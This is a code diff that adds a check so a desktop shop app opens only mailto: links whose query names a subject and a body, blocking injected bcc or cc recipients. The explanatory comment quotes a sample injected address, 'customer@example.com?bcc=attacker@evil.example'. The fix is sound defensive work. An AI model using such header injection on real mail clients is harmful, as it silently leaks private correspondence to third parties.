@@ -3744,8 +3744,35 @@ registerLanServer({
   receiptsDir,
 });
 
+/**
+ * A mailto: may name a subject and a body. It may not name another recipient.
+ *
+ * The renderer builds these, and one of them interpolated a CLIENT'S EMAIL
+ * without encoding it — an address the LAN intake form takes from anyone who can
+ * reach it. `customer@example.com?bcc=attacker@evil.example` added a header to
+ * the shop's own reply and copied it to a stranger, in a compose window that
+ * looked normal. That is fixed where the URL is built; this refuses it here too,
+ * because the main process should not open a recipient the shop cannot see.
+ *
+ * `cc` is refused as well: nothing in Khayt sends one, so its only appearance
+ * would be an injected one.
+ */
+function mailtoHasNoHiddenRecipients(s) {
+  const q = s.indexOf('?');
+  if (q === -1) return true;                     // address only
+  // A second '?' cannot appear in a correctly-encoded mailto, and an address
+  // containing one is how the header gets in.
+  if (s.indexOf('?', q + 1) !== -1) return false;
+  let params;
+  try { params = new URLSearchParams(s.slice(q + 1)); } catch { return false; }
+  for (const key of params.keys()) {
+    if (!/^(subject|body)$/i.test(key)) return false;
+  }
+  return true;
+}
+
 function isAllowedExternalUrl(s) {
-  if (s.startsWith('mailto:')) return true;
+  if (s.startsWith('mailto:')) return mailtoHasNoHiddenRecipients(s);
   if (s.startsWith('https://')) {
     try { return !isBlockedHost(new URL(s).hostname); } catch { return false; }
   }
